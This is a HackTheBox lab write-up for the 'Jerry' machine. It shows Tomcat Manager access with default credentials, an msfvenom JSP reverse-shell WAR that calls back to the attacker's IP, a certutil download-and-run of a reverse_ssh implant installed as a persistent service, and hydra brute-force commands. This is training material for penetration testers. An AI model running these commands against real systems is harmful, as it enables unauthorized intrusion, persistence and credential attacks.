---
render_with_liquid: false
title: HackTheBox Writeup  Jerry
date: 2023-09-26 19:01:11 +1400
tags: [hackthebox, nmap, windows, tomcat, tomcat-manager, msfvenom, revshell-war, jsp, oscp-like, reverse-ssh, hydra]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ writehosts htb '10.129.136.9 jerry.htb'
+---------+--------+--------------+-----------+
| PROFILE | STATUS |      IP      |  DOMAIN   |
+---------+--------+--------------+-----------+
| htb     | on     | 10.129.136.9 | jerry.htb |
+---------+--------+--------------+-----------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Tue Sep 26 19:01:11 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 8080 jerry.htb
Nmap scan report for jerry.htb (10.129.136.9)
Host is up, received user-set (0.062s latency).
Scanned at 2023-09-26 19:01:11 CST for 12s

PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.88
|_http-open-proxy: Proxy might be redirecting requests

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Sep 26 19:01:23 2023 -- 1 IP address (1 host up) scanned in 12.35 seconds
```


## 8080 - Site : Apache Tomcat 7.0.88


### Info

```css
http://jerry.htb:8080 [200] [Apache Tomcat/7.0.88] [Apache-Coyote/1.1] [Apache Tomcat,Java] [2451569ed4b99c2f00bd41d8965fe09c490d58a8]
```

![](/assets/obsidian/6f82a6fb47e867711b5ac9559146b40d.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ cat bulkdirb.txt|awk '$1 != 400'|grep -v 'jerry.htb:8080/docs/'
200      GET       22l       93w    42556c http://jerry.htb:8080/favicon.ico
401      GET       63l      289w     2536c http://jerry.htb:8080/manager/status
401      GET       63l      289w     2536c http://jerry.htb:8080/manager/html
401      GET       54l      241w     2098c http://jerry.htb:8080/host-manager/html
200      GET      201l      495w    11398c http://jerry.htb:8080/
200      GET       32l      149w     1299c http://jerry.htb:8080/examples/websocket/index.xhtml
200      GET       32l      152w     1285c http://jerry.htb:8080/examples/
401      GET       54l      241w     2098c http://jerry.htb:8080/host-manager/text/
200      GET        0l        0w        0c http://jerry.htb:8080/lpt1
200      GET        0l        0w        0c http://jerry.htb:8080/lpt2
401      GET       63l      289w     2536c http://jerry.htb:8080/manager/text/
200      GET        0l        0w        0c http://jerry.htb:8080/prn
200      GET      967l     1204w    68761c http://jerry.htb:8080/tomcat.svg
```


# User Flag
---

# Root Flag
---

## Shell as NT Authority System

### Login to tomcat manager as tomcat

![](/assets/obsidian/b15651adcb4500dfed598e135c98ced2.png)

Clicked on **Server Status**, successfully login with `admin`:`admin`

Target system info revealed : `Windows Server 2012 R2`

![](/assets/obsidian/75cc078d5654331cccda52041b04229e.png)

Access denied to **List Applications**, only users with `manager-gui` role are able to do that

![](/assets/obsidian/4ab3b7aeee8b4839f235d1ce9c2a3c6a.png)

Check the default creds for `tomcat`

![](/assets/obsidian/5e1a198693c732c2a610027bf83a8106.png)

Open a new private window from firefox (Since there was no cookie data, so that's the way to switch user)

Successfully login with `tomcat`:`s3cret`, now I can manage applications

![](/assets/obsidian/1e5fdd9cb736597f1c8e1347427fe4d8.png)


### Upload war reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.13 LPORT=1111 -f war > rev.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
```

It's basically just a jsp webshell in a zip file with required directory name and `web.xml` config file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ unzip -l rev.war
Archive:  rev.war
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2023-09-26 20:57   WEB-INF/
      265  2023-09-26 20:57   WEB-INF/web.xml
     1497  2023-09-26 20:57   pzmsvuuktltroj.jsp
---------                     -------
     1762                     3 files
```

Upload and deploy the application

![](/assets/obsidian/502541a22dc29fbe79f11f99329f8824.png)

This pops up

![](/assets/obsidian/b8b4e94cb4eb05db5f38df069b5552be.png)

Then trigger it

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ http http://jerry.htb:8080/rev/
HTTP/1.1 200 OK
Content-Length: 6
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 26 Sep 2023 20:00:30 GMT
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=90DCDD646CF55F0C90E3D667240C2884; Path=/rev; HttpOnly
```

Wow... it's system already

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.13] from (UNKNOWN) [10.129.136.9] 49196
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```


## Get a stable shell

Use [reverse ssh](https://github.com/NHAS/reverse_ssh)

Start listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:22521
```

Deploy client

```bash
C:\apache-tomcat-7.0.88>certutil.exe -urlcache -split -f http://10.10.16.13/win/client.exe c:\programdata\client.exe
certutil.exe -urlcache -split -f http://10.10.16.13/win/client.exe c:\programdata\client.exe
****  Online  ****
  000000  ...
  ea7a00
CertUtil: -URLCache command completed successfully.

C:\apache-tomcat-7.0.88>c:\programdata\client.exe -d 10.10.16.13:22521
c:\programdata\client.exe -d 10.10.16.13:22521
```

Connect and implant persistence

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh 127.0.0.1 -p 22521 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 7dfa16d3907419ee07fe1a3c2a3cc07ff950af21 | SSH-v2.1.5-windows_amd64 |
| fc93c7f5275f694f3ebec8fb4c6f02c3aba98b1c |                          |
| nt.authority.system.jerry                |                          |
| 10.129.136.9:49199                       |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh -J 127.0.0.1:22521 nt.authority.system.jerry -s service --install
```

Open a shell

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh -J 127.0.0.1:22521 nt.authority.system.jerry
The authenticity of host 'nt.authority.system.jerry (<no hostip for proxy command>)' can't be established.
ED25519 key fingerprint is SHA256:PJ4998W37q0v63SAqd5HV1tgLN2FZsxwqh7fmFWc3RU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:114: [hashed name]
    ~/.ssh/known_hosts:115: [hashed name]
    ~/.ssh/known_hosts:121: [hashed name]
    ~/.ssh/known_hosts:123: [hashed name]
    ~/.ssh/known_hosts:124: [hashed name]
    ~/.ssh/known_hosts:127: [hashed name]
    ~/.ssh/known_hosts:128: [hashed name]
    ~/.ssh/known_hosts:129: [hashed name]
    (18 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nt.authority.system.jerry' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\apache-tomcat-7.0.88>
```


## Find flags

```bash
PS C:\apache-tomcat-7.0.88> cd C:\Users\Administrator
PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d-r--         6/19/2018   6:43 AM            Contacts
d-r--         6/19/2018   7:09 AM            Desktop
d-r--         6/19/2018   6:43 AM            Documents
d-r--         1/21/2022   8:23 PM            Downloads
d-r--         6/19/2018   6:43 AM            Favorites
d-r--         6/19/2018   6:43 AM            Links
d-r--         6/19/2018   6:43 AM            Music
d-r--         6/19/2018   6:43 AM            Pictures
d-r--         6/19/2018   6:43 AM            Saved Games
d-r--         6/19/2018   6:43 AM            Searches
d-r--         6/19/2018   6:43 AM            Videos


PS C:\Users\Administrator> cd .\Desktop
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         6/19/2018   7:09 AM            flags


PS C:\Users\Administrator\Desktop> cd .\flags
PS C:\Users\Administrator\Desktop\flags> ls


    Directory: C:\Users\Administrator\Desktop\flags


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         6/19/2018   7:11 AM         88 2 for the price of 1.txt


PS C:\Users\Administrator\Desktop\flags> cat '.\2 for the price of 1.txt'
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```


# Additional
---

## Brute Force Tomcat Login

In other cases, the credentials might be changed

```bash

# Default Creds for tomcat
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt jerry.htb -s 8080 http-get /manager/html -I -vV -t 50


# Common Default Creds
hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/seclists/Passwords/cirt-default-passwords.txt jerry.htb -s 8080 http-get /manager/html -I
```

> The `cirt-default` wordlist takes about 20 minutes to get a result
{: .prompt-tip }


## Failed Attempts


### Exploit tomcat 7.0.88 - JSP Upload Bypass (CVE-2017-12617)

```bash
searchsploit apache tomcat 7.0.88
```

![](/assets/obsidian/6a627d83e065f11907be6b35d853c356.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ searchsploit -m 42966
  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/42966
     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
    Codes: CVE-2017-12617
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/Jerry/42966.py
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Jerry]
└─$ p python 42966.py -u http://jerry.htb:8080/



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/



[@intx0x80]


Poc Filename  Poc.jsp
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  10.129.136.9:8080  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  10.129.136.9:8080  ...  OK
Not Vulnerable to CVE-2017-12617
```

![](/assets/obsidian/80e0ebe566e0217c71d2efe097b852e7.png)

Tried to change the filename, still failed

![](/assets/obsidian/daaef3c149769382484f7b94d714c436.png)